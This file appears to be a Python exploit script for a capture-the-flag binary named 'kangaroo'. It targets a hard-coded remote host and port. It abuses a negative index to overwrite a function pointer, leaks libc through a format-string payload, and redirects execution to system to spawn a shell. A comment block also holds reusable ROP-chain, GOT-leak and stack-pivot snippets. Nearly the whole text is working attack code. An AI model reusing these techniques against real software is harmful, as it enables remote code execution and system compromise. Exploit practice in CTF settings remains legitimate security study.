# from pwn import cyclic_gen
from ptrlib import *
import argparse
import string

binary = "./kangaroo"
elf = ELF(binary)

r = None
"""
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
"""
libc = ELF("./libc.so.6")
r = Socket("nc 34.170.146.252 54223")
# """


parser = argparse.ArgumentParser()
parser.add_argument(
    "--host",
    default="127.0.0.1",
    help="target host"
)
parser.add_argument(
    "--port",
    default=3001,
    help="target port"
)
parser.add_argument(
    '--log',
    action='store_true'
)
parser.add_argument(
    '--remote',
    nargs=2,
    metavar=('REMOTE_HOST', 'REMOTE_PORT'),
    help='remote host and port'
)
args = parser.parse_args()


log = args.log
is_remote = r is not None or args.remote is not None
if r is None:
    if is_remote:
        host = args.remote[0]
        port = args.remote[1]
        r = Socket(host, port)
    else:
        r = Process(binary)


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


def wait_for_attach():
    if not is_remote:
        input('attach?')


def sla(*args):
    r.sendlineafter(*args)


def decrypt(cipher):
    key = 0
    plain = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain


def encrypt(val, addr):
    return val ^ (addr >> 12)


'''
snippets

## LIBC
environ = libc.symbol("environ")
logger.info("environ: " + hex(environ))

## ELF
elf.got("puts")
elf.plt("puts")

## ROP Gadgets
rop = [
    next(libc.gadget("ret")),
    next(libc.gadget("pop rdi; ret")),
    next(libc.find("/bin/sh")),
    libc.symbol("system")
]

payload += flat([
  # puts(puts@got)
  next(elf.gadget("pop rdi; ret;")),
  elf.got("puts"),
  elf.plt("puts"),
  # gets(stage2)
  next(elf.gadget("pop rdi; ret;")),
  addr_stage2,
  elf.plt("gets"),
  # stack pivot
  next(elf.gadget("pop rbp; ret;")),
  addr_stage2,
  next(elf.gadget("leave\n ret")) # GCC-style
], map=p64)

## ASM

print(assemble("""
  xor r12, r10
  movups [rsp], xmm0
  .word 12345
""", arch='amd64').hex()) # or bits=64/arch='intel' and so on

print(nasm("""
  call X
  db "Hello", 0
X:
  pop rax
""", bits=64).hex())

## Interaction
r.sendlineafter("> ", "1")
r.recvlineafter("> ")
r.sh()

## misc (pwntools)
g = cyclic_gen()
g = g.get(0x100)
(pos, chunk, idx) = g.find("baaa")
'''

def do_read(offset, msg):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(str(offset))
    r.recvuntil(": ")
    r.sendline(msg)

def write_msg(offset):
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil(": ")
    r.sendline(str(offset))
    r.recvuntil(": ")
    return r.recvline()

def clear():
    r.recvuntil("> ")
    r.sendline("3")




idx = -8198552921648689600
do_read(idx, b"A" * 64 + p64(elf.plt("printf")))
do_read(0, "START%llx %llx %llx %llx %llx %llx %llx %llx %llxEND\n")
clear()
r.recvuntil("START")
s = int(r.recvuntil(b"END").replace(b"END", b"").split(b" ")[8], 16)
print("libc_base:", hex(s))

if is_remote:
    libc.base = s - 0x29d90 - 0x1ca - 0x270
else:
    libc.base = s - 0x29d90

do_read(idx, b"A" * 64 + p64(libc.symbol("system")))
do_read(0, "sh; ")
clear()




r.interactive()